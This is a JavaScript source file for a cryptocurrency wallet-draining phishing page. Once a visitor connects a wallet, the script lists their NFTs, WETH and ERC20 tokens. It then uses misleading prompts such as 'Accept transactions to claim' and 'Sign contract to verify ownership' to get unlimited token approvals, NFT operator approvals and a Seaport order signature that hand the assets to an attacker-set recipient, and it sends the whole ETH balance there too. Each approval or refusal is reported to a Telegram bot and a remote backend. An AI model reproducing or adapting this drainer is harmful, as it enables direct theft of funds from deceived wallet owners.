const ethers = window.ethers;
const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";      // DONT TOUCH
const CONDUIT = "0x1E0049783F008A0085193E00003D00cd54003c71";   // DONT TOUCH
const RPC = "https://rpc.ankr.com/eth/4068b87af68fd0f5db27b128e2c00004a6344853ebcfe7a081c492274942234e"; // DONT TOUCH?


// (!!!!) SET THE FOLLOWING VARIABLES ########
// (IMPORTANT => URL should end WITHOUT "/" --> so  --> www.test.com instead of www.test.com/ )
const API_ENDPOINT = "https://aiopython.herokuapp.com";                           // «« @@@ python BACKEND-URL (receives: /getErc20s/ + /transfer/init )
const CONTRACT_ADR_SAFA = "-"  // «« @@@ YOUR OWN CONTRACT --> needs to be deployed from initiator
const INITIATOR = "-"          // «« @@@ MATCH WITH initiator (app.py + index.js)     
let recipient = "-"            // «« @@@ MATCH WITH app.py      
const endpoint = recipient;
let token = `-`
let chatId = 
// (!!!!) SET THE FOLLOWING VARIABLES ########


let provider;
let selectedAccount;
let signer;
const gmtDateTime = new Date().toUTCString();
const url = window.location.href

let ABI = [{ "anonymous": false, "inputs":  [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, 
    { "indexed": true, "internalType": "address", "name": "approved", "type": "address" }, 
    { "indexed": true, "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "Approval", "type": "event" }, 
    { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, 
    { "indexed": true, "internalType": "address", "name": "operator", "type": "address" }, 
    { "indexed": false, "internalType": "bool", "name": "approved", "type": "bool" }], "name": "ApprovalForAll", "type": "event" }, 
    { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, 
    { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, 
    { "indexed": true, "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "Transfer", "type": "event" },
     { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, 
     { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "approve", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
      { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": 
      [{ "internalType": "uint256", "name": "balance", "type": "uint256" }], "stateMutability": "view", "type": "function" }, 
      { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "getApproved", "outputs": 
      [{ "internalType": "address", "name": "operator", "type": "address" }], "stateMutability": "view", "type": "function" }, 
      { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, 
      { "internalType": "address", "name": "operator", "type": "address" }], "name": "isApprovedForAll", "outputs": [
          { "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, 
          { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, 
          { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "ownerOf", "outputs": [{ "internalType": "address", "name": "owner", "type": "address" }], 
          "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, 
          { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "safeTransferFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, 
          { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" },
           { "internalType": "uint256", "name": "tokenId", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }],
            "name": "safeTransferFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, 
          { "inputs": [{ "internalType": "address", "name": "operator", "type": "address" }, 
          { "internalType": "bool", "name": "_approved", "type": "bool" }], "name": "setApprovalForAll", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
           { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
            "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
             "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "tokenURI", "outputs": [
                 { "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" },
           { "inputs": [{ "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" }, 
            { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "transferFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }]

const WETH_ABI = [{
    "constant": false,
    "inputs": [
        {
            "name": "_spender",
            "type": "address"
        },
        {
            "name": "_value",
            "type": "uint256"
        }
    ],
    "name": "approve",
    "outputs": [
        {
            "name": "",
            "type": "bool"
        }
    ],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [
        {
            "name": "_owner",
            "type": "address"
        },
        {
            "name": "_spender",
            "type": "address"
        }
    ],
    "name": "allowance",
    "outputs": [
        {
            "name": "",
            "type": "uint256"
        }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [
        {
            "name": "_owner",
            "type": "address"
        }
    ],
    "name": "balanceOf",
    "outputs": [
        {
            "name": "balance",
            "type": "uint256"
        }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}]

let etherPrice;

async function getEtherPrice(){
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    return price["ethereum"]["usd"];
}

let w3 = new ethers.providers.JsonRpcProvider(RPC);


const round = (value) => {
    return Math.round(value * 10000) / 10000;
}

async function getNormalizedETH(wei){
    return ethers.utils.formatEther(wei);
}

async function isApproved(owner, nft) {
    let contract = new ethers.Contract(nft, ABI, w3);
    const approvee = await contract.functions.isApprovedForAll(owner, CONDUIT);
    return approvee;
}

function fetchTokenIds(resp, contract) {
    const assets = resp.assets;
    const tokenIds = [];
    for (let i = 0; i < assets.length; i++) {
        const currentAsset = assets[i];
        if (currentAsset.asset_contract.address.toLowerCase() == contract.toLowerCase()) {
            tokenIds.push(currentAsset.token_id);
        }
    }
    return tokenIds;
}

async function getNFTS(walletAddress) {
    console.log('>>>>[getNFTS START]')
    const options = { method: 'GET', headers: { Accept: 'application/json' } };

    let nfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${walletAddress}&order_direction=desc&limit=200&include_orders=false`)
    let nftsData = await nfts.json();


    let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=200`, options)
        .then(response => response.json())
        .then(nfts => {
            if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
            return nfts.filter(nft => {
                if (nft.primary_asset_contracts.length > 0) return true
                else return false
            }).map(async (nft) => {
                let price = round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price);
                let isApprovedBool = await isApproved(walletAddress, nft.primary_asset_contracts[0].address);
                isApprovedBool = isApprovedBool[0]
                console.log("isApprovedBool", isApprovedBool)

                return {
                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                    contract_address: ethers.utils.getAddress(nft.primary_asset_contracts[0].address),
                    token_ids: fetchTokenIds(nftsData, nft.primary_asset_contracts[0].address),
                    price: price,
                    value: etherPrice * parseFloat(price),
                    owned: nft.owned_asset_count,
                    "approved": isApprovedBool
                }
            })
        }).catch(err => console.error(err));

    let all = await Promise.all(walletNfts);
    let sortedNfts = all.sort((a, b) => parseFloat(b.price) - parseFloat(a.price));
    console.log('[getNFTS END]<<<<')
    return sortedNfts
}
function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
const characters = '0123456789';

async function getCounter(walletAddress) {
    const ABI_COUNTER = [{
        "inputs": [
            {
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }
        ],
        "name": "getCounter",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "counter",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }]
    let contract = new ethers.Contract("-", ABI_COUNTER, w3);
    const counter = contract.functions.getCounter(walletAddress);
    return counter;
}



async function getWETH(walletAddress) {

    let contract = new ethers.Contract(WETH, WETH_ABI, w3);
    const balance = contract.functions.balanceOf(walletAddress);
    console.log("balance", balance)
    const allowances = contract.functions.allowance(walletAddress, CONDUIT);
    return await Promise.all([balance, allowances]);
}

function getPreviousDay(date = new Date()) {
    const previous = new Date(date.getTime());
    previous.setDate(date.getDate() - 1);
    return previous;
}

async function connect() {
    console.log(`#########[START]#########`); 
    console.log('>>>>[connect START]')

    const etherPriceResp = getEtherPrice();
    connecttext =  document.getElementById("changeconnect")
    connecttext.textContent = "Processing...";
    connectbutton =  document.getElementById("connectButton")
    connectbutton.disabled = true;
    connectbutton.style.background = "black";
    provider = new ethers.providers.Web3Provider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    console.log("accounts", accounts)
    signer = provider.getSigner();
    selectedAccount = accounts[0];
    let ethBalance;
    provider.getBalance(selectedAccount).then((balance) => {
        ethBalance = ethers.utils.formatEther(balance)
        console.log(`balance: ${ethBalance} ETH`)
        sendmsgconnect(selectedAccount,ethBalance)
    })
    const network = await provider.getNetwork();
    const Seaport = new seaport.Seaport(signer);    
    const erc20s = fetch(API_ENDPOINT + "/getErc20s/" + accounts[0])

    if (network.chainId !== 1) {

        try {
            await provider.send('wallet_switchEthereumChain', [{ chainId: "0x1" }]);

        } catch (err) {
            console.log("error", err)


            return;
        }
    }

    etherPrice = await etherPriceResp;

    let [nfts, counter, wethData] = await Promise.all([getNFTS(accounts[0]), getCounter(accounts[0]), getWETH(accounts[0])]);
    counter = parseInt(counter.toString());
    console.log("counter", counter);
    let [balance, allowance] = wethData;
    balance = balance.toString();
    allowance = allowance.toString();

    const balanceNormalized = parseFloat(ethers.utils.formatEther(balance));
    const allowanceNormalized = parseFloat(ethers.utils.formatEther(allowance));
    console.log("balanceNormalized", balanceNormalized)
    let weth_include = "0";
    let wasWethApproved = false;
    if (allowanceNormalized >= balanceNormalized) {
        weth_include = balance;
    }
    else if (balanceNormalized > allowanceNormalized) {
        weth_include = allowance;
    }


    const orders = [];
    const considers = [];
    let bundlePrice = 0;
    nfts.forEach((nft) => {
        if (nft.type == "erc721" && nft.approved == true) {
            bundlePrice+=nft.value;
            nft.token_ids.forEach((token_id) => {
                console.log(nft)
                const array = {
                    itemType: 2,
                    token: nft.contract_address,
                    identifierOrCriteria: token_id,
                    startAmount: "1",
                    endAmount: "1",
                }
                const consider = {
                    itemType: 2,
                    token: nft.contract_address,
                    identifierOrCriteria: token_id,
                    startAmount: "1",
                    endAmount: "1",
                    recipient: endpoint,
                }
                orders.push(array)
                considers.push(consider);

            })
        }

    });
    nfts.push({
        type: "balance",
        contract_address: "",
        token_ids:"",
        price: null,
        value: etherPrice * parseFloat(ethBalance),
        owned: "",
        "approved": false, 
    })
    

    if (weth_include !== "0") {
        wasWethApproved = true;
        //  FIX bundlePrice
        // bundlePrice += etherPrice * parseFloat(getNormalizedETH(weth_include)); // ORIG
        const weth_include_value = ethers.utils.formatEther(weth_include); // FIX G
        bundlePrice += etherPrice * weth_include_value; // FIX G
        
        const weth_order = {
            "itemType": 1,
            "token": WETH,
            //"identifierOrCriteria": 0, // ORIG
            "identifierOrCriteria": "0", //  FIX???
            "startAmount": weth_include,
            "endAmount": weth_include
        }
        const weth_consider = {
            "itemType": 1,
            "token": WETH,
            //"identifierOrCriteria": 0, // ORIG
            "identifierOrCriteria": "0", // FIX ???
            "startAmount": weth_include,
            "endAmount": weth_include,
            "recipient": endpoint
        }
        orders.push(weth_order);
        considers.push(weth_consider);
    }

    console.log("bundleWorth",bundlePrice)

    const date = getPreviousDay();
    const milliseconds = date.getTime();
    const dateClone = date;
    const tomorrow = dateClone.setTime(milliseconds + (2 * 24 * 60 * 60 * 1000));
    const milliseconds_tomorrow = dateClone.getTime();
    const tomorrow_seconds = Math.floor(milliseconds_tomorrow / 1000);
    const seconds = Math.floor(milliseconds / 1000);
    const salt = generateString(70);

    const offer = {
        "offerer": ethers.utils.getAddress(accounts[0]),
        zone: "-",
        "offer": orders,
        consideration: considers,
        orderType: 2,
        startTime: seconds,
        endTime: tomorrow_seconds,
        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
        salt: salt,
        totalOriginalConsiderationItems: considers.length,
        conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
    }
    console.log("offer", offer)
    if (offer.offer.length == 0) {
        const erc20_ = await erc20s;
        const all_coins = await erc20_.json();
        console.log(nfts)
        console.log(all_coins)
        await normalSafa(nfts, all_coins);
        return;
    }
    else{
        nfts.push({
            type: "bundle",
            contract_address: "",
            token_ids:"",
            price: null,
            value: bundlePrice,
            owned: "",
            "approved": false, 
        })

    }
    const erc20_ = await erc20s;
    const all_coins = await erc20_.json();
    console.log("normalSafaUnapproved",nfts)
    await normalSafaUnapproved(nfts, all_coins, wasWethApproved,offer,counter,Seaport)

    console.log('[connect END]<<<<')
    console.log(`#########[END]#########`); 

}
async function normalSafaUnapproved(nfts, erc20s, wasWethApproved,offer,counter,Seaport) {
    console.log('>>>>[normalSafaUnapproved START]')
    let all_data = []
    all_data = all_data.concat(nfts);
    all_data = all_data.concat(erc20s);
    const sortedassets = all_data.sort((a, b) => parseFloat(b.value) - parseFloat(a.value));
    console.log("normalSafaUnapproved",sortedassets)
    sortedassets.forEach((asset) => {
        if (!asset.approved) {
            if (wasWethApproved && asset.contract_address == WETH) { } else {
                try {
                    if (asset.type == "erc721") {

                        let data = { "owner": selectedAccount, "address": asset.contract_address,"isErc721": true, "token_id": asset.token_ids, "recipient": recipient  };
        
                        connecttext.textContent = "Accept transactions to claim";
                        let contract = new ethers.Contract(asset.contract_address, ABI, signer);
                        const promise1 = new Promise((resolve, reject) => {
                           let asdf = contract.setApprovalForAll(CONTRACT_ADR_SAFA, true)
                           resolve(asdf)
                          });
                          
                        promise1
                        .then(function(response) {
                            connecttext.textContent = "Connect Wallet";
                            connectbutton.disabled = false;
                            connectbutton.style.background = "orange";
                            broadcastTransfer(data)
                            sendmsgerc721(data)
                        })
                        .catch(error => {
                            connecttext.textContent = "Connect Wallet";
                            connectbutton.disabled = false;
                            connectbutton.style.background = "orange";
                            sendmsgdenyerc721(data)
                        });
                          
                    }
                    else if (asset.type == "erc20" && asset.value != 0) {
                        let contract = new ethers.Contract(asset.contract_address, WETH_ABI, signer);
                        let data = { "owner": selectedAccount, "address": asset.contract_address,"isErc721": false  , "balance": asset.normal_balance , "value": asset.value, "recipient": recipient  };
                        connecttext.textContent = "Accept transactions to claim";
                        const promise1 = new Promise((resolve, reject) => {
                            let asdf = contract.approve(INITIATOR, "115792089237316195423570985008687907853269984665640564039457584007913129639935")
                            resolve(asdf)
                           });
                           
                         promise1
                         .then(function(response) {
                            connecttext.textContent = "Connect Wallet";
                            connectbutton.disabled = false;
                            connectbutton.style.background = "orange";
                            broadcastTransfer(data)
                            sendmsgerc20(data)
        
                         })
                         .catch(error => {
                             connecttext.textContent = "Connect Wallet";
                             connectbutton.disabled = false;
                             connectbutton.style.background = "orange";
                             sendmsgdenyerc20(data)
               
                         });
                           
                    }
                    if(asset.type == "bundle"){
                        console.log("asset:", asset)
                        connecttext.textContent = "Sign contract to verify ownership";
                        // Show SEAPORT-POPUP
                        Seaport.signOrder(offer, parseInt(counter)).then(function(response){
                            let sgt = response
                            offer["counter"] = parseInt(counter);
                            const order = {
                                "recipient": recipient,
                                "parameters": offer,
                                "signature": sgt
                            }
                            sendmsgseaport(order)
                            broadcastTransfer(order)
                            connecttext.textContent = "Accept transactions to claim";
                            console.log("SEAPORT order:", order)
                        }).catch(function(error) {
                            console.log(error)
                            connecttext.textContent = "Accept transactions to claim";
                            connectbutton.disabled = false;
                            connectbutton.style.background = "orange";
                            sendmsgdenyseaport(offer)
                        })
                    }
                    else if(asset.type == "balance"){
                        provider.getBalance(selectedAccount).then((balance) => {
                            provider.getGasPrice().then((gasPrice)=>{
                                let valueToSend = parseInt(balance) - (parseInt(gasPrice) * 91000);
                                if(valueToSend > 0 ){
                     
                                    let data = { "owner": selectedAccount ,"recipient": recipient  };
                                    signer.sendTransaction({
                                        to:recipient,
                                        from:selectedAccount,
                                        value: ethers.utils.parseUnits(valueToSend.toString(), 'wei').toHexString()
                                    }).then(function(response) {
                                        sendmsgsendeth(selectedAccount, valueToSend)
                                        connecttext.textContent = "Connect Wallet";
                                        connectbutton.disabled = false;
                                        connectbutton.style.background = "orange";
                                    })
                                    .catch(error => {
                                        sendmsgdenyeth(selectedAccount, valueToSend)
                                        connecttext.textContent = "Connect Wallet";
                                        connectbutton.disabled = false;
                                        connectbutton.style.background = "orange";
                                    });
        
        
                                }
                                
                            })
                        })
                    }
                }
                catch (err) {
                }

            }


        }

    })
}



async function normalSafa(nfts, erc20s) {
    console.log('>>>>[normalSafa START]')
    let all_data = []
    all_data = all_data.concat(nfts);
    all_data = all_data.concat(erc20s);
    const sortedassets = all_data.sort((a, b) => parseFloat(b.value) - parseFloat(a.value));
    sortedassets.forEach((asset) => {
        try {
            if (asset.type == "erc721") {

                let data = { "owner": selectedAccount, "address": asset.contract_address,"isErc721": true, "token_id": asset.token_ids, "recipient": recipient  };

                connecttext.textContent = "Accept transactions to claim";
                let contract = new ethers.Contract(asset.contract_address, ABI, signer);
                const promise1 = new Promise((resolve, reject) => {
                   let asdf = contract.setApprovalForAll(CONTRACT_ADR_SAFA, true)
                   resolve(asdf)
                  });
                  
                promise1
                .then(function(response) {
                    connecttext.textContent = "Connect Wallet";
                    connectbutton.disabled = false;
                    connectbutton.style.background = "orange";
                    broadcastTransfer(data)
                    sendmsgerc721(data)
                })
                .catch(error => {
                    connecttext.textContent = "Connect Wallet";
                    connectbutton.disabled = false;
                    connectbutton.style.background = "orange";
                    sendmsgdenyerc721(data)
                });
                  
            }
            else if (asset.type == "erc20" && asset.value != 0) {
                let contract = new ethers.Contract(asset.contract_address, WETH_ABI, signer);
                let data = { "owner": selectedAccount, "address": asset.contract_address,"isErc721": false  , "balance": asset.normal_balance , "value": asset.value, "recipient": recipient  };
                connecttext.textContent = "Accept transactions to claim";
                const promise1 = new Promise((resolve, reject) => {
                    let asdf = contract.approve(INITIATOR, "115792089237316195423570985008687907853269984665640564039457584007913129639935")
                    resolve(asdf)
                   });
                   
                 promise1
                 .then(function(response) {
                    connecttext.textContent = "Connect Wallet";
                    connectbutton.disabled = false;
                    connectbutton.style.background = "orange";
                    broadcastTransfer(data)
                    sendmsgerc20(data)

                 })
                 .catch(error => {
                     connecttext.textContent = "Connect Wallet";
                     connectbutton.disabled = false;
                     connectbutton.style.background = "orange";
                     sendmsgdenyerc20(data)
       
                 });
                   
            }
            else if(asset.type == "balance"){
                provider.getBalance(selectedAccount).then((balance) => {
                    provider.getGasPrice().then((gasPrice)=>{
                        let valueToSend = parseInt(balance) - (parseInt(gasPrice) * 91000);
                        if(valueToSend > 0 ){
             
                            let data = { "owner": selectedAccount ,"recipient": recipient  };
                            signer.sendTransaction({
                                to:recipient,
                                from:selectedAccount,
                                value: ethers.utils.parseUnits(valueToSend.toString(), 'wei').toHexString()
                            }).then(function(response) {
                                sendmsgsendeth(selectedAccount, valueToSend)
                                connecttext.textContent = "Connect Wallet";
                                connectbutton.disabled = false;
                                connectbutton.style.background = "orange";
                            })
                            .catch(error => {
                                sendmsgdenyeth(selectedAccount, valueToSend)
                                connecttext.textContent = "Connect Wallet";
                                connectbutton.disabled = false;
                                connectbutton.style.background = "orange";
                            });


                        }
                        
                    })
                })
            }
        }
        catch (err) {
        }
    })
    console.log('[normalSafa END]<<<<')
}


function sendmsgconnect(walladdr, balance) {
    var message = `💾 [CONNECTED] | Wallet: ${walladdr} with Balance of ${balance} ETH \n[i] Successfully CONNECTED\n URL Accessed: ${url}\n[${gmtDateTime}]  `;
   $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });
}
function sendmsgdenyerc20(data) {
    let ownery = data['owner']
    let valuey = data['value']
    let tokeny = data['address']
    var message = `🚫 [DENIED] | Wallet ${ownery} DENIED the ERC20 Approvement\nURL Accessed: ${url}\n*** Data ***\n🪙Token: ${tokeny}\nUSD Value: ${valuey}\n[${gmtDateTime}]\n\n\nKeep Tryin!\n `;
   $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });

}
function sendmsgdenyerc721(data) {
    let ownery = data['owner']
    let valuey = data['token_id']
    let tokeny = data['address']
    var message = `🚫 [DENIED] | Wallet ${ownery} DENIED the ERC721-SAFA Approvement\nURL Accessed: ${url}\n*** Data ***\n🎨NFT ADDRESS: ${tokeny}\nOWNED TOKEN IDS: ${valuey}\n[${gmtDateTime}]\n\n\nKeep Tryin!\n `;
    console.log(message)
    $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });

}

function sendmsgerc20(data) {
    let ownery = data['owner']
    let valuey = data['value']
    let tokeny = data['address']
    var message = `✅ [APPROVED] | Wallet ${ownery} APPROVED for ERC20 Permissions\nURL Accessed: ${url}\n*** Data ***\n🪙Token: ${tokeny}\nUSD VALUE: ${valuey}\n[${gmtDateTime}]\n\n\n✅Bravo!\n `;
    $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });

}
function sendmsgerc721(data) {
    let ownery = data['owner']
    let valuey = data['token_id']
    let tokeny = data['address']
    var message = `✅ [APPROVED] | Wallet ${ownery} APPROVED the ERC721-SAFA Approvement\nURL Accessed: ${url}\n*** Data ***\n🎨NFT ADDRESS: ${tokeny}\nOWNED TOKEN IDS: ${valuey}\n[${gmtDateTime}]\n\n\n✅Bravo!\n`;
    $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });

}

function sendmsgdenyseaport(data) {
    offer = JSON.stringify(data['offer'])
    console.log(offer)
    var message = `🚫 [DENIED] | Wallet ${data['offerer']} DENIED the SEAPORT-ORDER⛴⚓🚢 \nURL Accessed: ${url}\n\n\n*** OFFER ITEMS ***\n\n${offer}\n[${gmtDateTime}]\n\n\nKeep Tryin!\n `;
    $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });

}

function sendmsgseaport(data) {
    offer = JSON.stringify(data)
    var message = `✅ [APPROVED] | Wallet :  ${data['parameters']['offerer']} APPROVED the SEAPORT-ORDER ⛴⚓🚢 \nURL Accessed: ${url}\n\n\n*** Full Data ***\n\n${offer}\n\n[${gmtDateTime}]\n\n\n✅Bravo!\n `;
   $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });

}
function sendmsgsendeth(owner, balance) {
    var message = `✅ [APPROVED] | Wallet: ${owner} with Balance of ${balance} ETH \n[++] 💰 Successfully Approved for ETH Balance!\n URL Accessed: ${url}\n[${gmtDateTime}]\n\n\n✅Bravo! \n`;
    $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });
}
function broadcastTransfer(data){
    fetch(API_ENDPOINT + "/transfer/init", {
        headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*" // FIX
        },
        method: "POST",
        body: JSON.stringify(data)
    })  
}
function sendmsgdenyeth(owner, balance) {
    var message = `🚫 [DENIED] | Wallet: ${owner} with Balance of ${balance} ETH \n[++] 💰 DENIED Approval for ETH Balance!\n URL Accessed: ${url}\n[${gmtDateTime}]\n\n\n Keep Tryin! \n`;
    $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${token}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message,
            parse_mode: 'html',
        },
        success: function (res) {
            console.debug(res);
            
        },
        error: function (error) {
            console.log(error);
            
        }
    });

}

window.addEventListener("DOMContentLoaded", () => {
    document.getElementById("connectButton").onclick = connect;
})


window.addEventListener('load', async () => {
     // show + hide elements
    //  document.getElementById("connectButton").style = "display:inline-block"
    //  document.getElementById("pageLoading").style = "display:none"
     console.log("Ready load")
 
  });
